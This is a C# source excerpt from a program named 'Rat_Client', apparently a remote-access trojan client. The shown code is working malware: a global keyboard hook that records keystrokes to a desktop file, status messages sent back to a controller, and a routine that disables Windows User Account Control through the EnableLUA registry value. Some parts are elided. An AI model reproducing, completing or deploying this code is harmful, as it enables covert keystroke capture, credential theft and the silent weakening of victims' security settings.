...
namespace Rat_Client
{
    internal class Program
    {
        ...
        private static List<string> keystrokes = new List<string>();
        private static string keylogFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "keylogs.txt");
        private static bool isKeyloggerRunning = false;
        ...
        private static IntPtr KeyboardHookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                ...
                // Avoid logging modifier keys like Shift, Ctrl, and Alt
                if (key != "Shift" && key != "Control" && key != "Menu")
                {
                    // Check if the key is already in the list before adding it
                    if (!keystrokes.Contains(key))
                    {
                        keystrokes.Add(key);
                        AppendToFile(key);
                    }
        ...
        private static void KeyLogger()
        {
            try
            {
                hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, new LowLevelKeyboardProc(KeyboardHookProc), IntPtr.Zero, 0);
                if (hookHandle == IntPtr.Zero)
                {
                    Send("Failed to set keyboard hook.");
                    return;
                }
            ...
            {
                Send($"Error starting keylogger: {ex.Message}");
            }
        }

        // StopKeylogger function
            ...
            try
            {
                if (hookHandle != IntPtr.Zero)
                {
                    ...
                    if (success)
                    {
                        ...
                        Send("Keylogger stopped successfully.");
                    }
                    else
                    {
                        Send("Failed to stop keylogger.");
                    }
                }
                else
                {
                    Send("No active keylogger to stop.");
                }
            }
            catch (Exception ex)
            {
                Send($"Error stopping keylogger: {ex.Message}");
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hInstance, uint threadId);
        ...
        private static void AppendToFile(string key)
        {
            try
            {
                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string filePath = Path.Combine(desktopPath, "keylog.txt");

                // Append the keystroke to the text file
                File.AppendAllText(filePath, key + Environment.NewLine);
            }
            catch (Exception ex)
            {
                Send($"Error appending keystroke to text file: {ex.Message}");
            }
        }
        ...
        private static void SetUACToNeverNotify()
        {
            try
            {
                string registryKeyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
                string registryValueName = "EnableLUA";
                int disableUAC = 0;

                using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(registryKeyPath, writable: true))
                {
                    if (key != null)
                    {
                        key.SetValue(registryValueName, disableUAC, Microsoft.Win32.RegistryValueKind.DWord);
                    }
                }

                Send("UAC set to never notify. This may require a restart.");
            }
            catch (Exception ex)
            {
                Send($"Error setting UAC to never notify: {ex.Message}");
            }
        }

        private static void SetUACToNotify()
        {
            try
            {
                string registryKeyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
                string registryValueName = "EnableLUA";
                int enableUAC = 1;  // Set to 1 to enable UAC and display notifications

                using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(registryKeyPath, writable: true))
                {
                    if (key != null)
                    {
                        key.SetValue(registryValueName, enableUAC, Microsoft.Win32.RegistryValueKind.DWord);
                    }
                }

                Send("UAC notification set to notify. This may require a restart.");
            }
            catch (Exception ex)
            {
                Send($"Error setting UAC to notify: {ex.Message}");
            }
        }
